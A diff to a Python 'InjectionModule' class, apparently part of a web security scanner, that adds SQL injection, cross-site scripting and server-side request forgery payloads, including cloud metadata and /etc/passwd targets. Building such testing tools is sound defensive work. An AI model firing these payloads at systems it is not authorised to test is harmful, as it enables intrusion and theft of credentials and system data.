@@ -9,23 +9,28 @@ class InjectionModule:
     def __init__(self, auth_token: str):
         self.auth_token = auth_token
         
-        # Polyglot fuzzing payloads for basic injection coverage
+        # Polyglot fuzzing payloads for basic injection coverage.
+        # In a real enterprise system, we would fetch Seclists from a CDN here.
         self.payloads = {
             "sqli": [
                 "' OR '1'='1",
                 "' OR 1=1 --",
                 "admin' --",
-                "\" OR \"1\"=\"1"
+                "\" OR \"1\"=\"1",
+                "' UNION SELECT NULL--",
+                "1' ORDER BY 1--+"
             ],
             "xss": [
                 "\"><script>alert(document.domain)</script>",
                 "javascript:alert(1)//",
-                "<img src=x onerror=alert(1)>"
+                "<img src=x onerror=alert(1)>",
+                "'\"><svg/onload=alert(1)>"
             ],
             "ssrf": [
                 "http://169.254.169.254/latest/meta-data/",
                 "http://127.0.0.1:22",
-                "file:///etc/passwd"
+                "file:///etc/passwd",
+                "dict://127.0.0.1:11211/"
             ]
         }
 
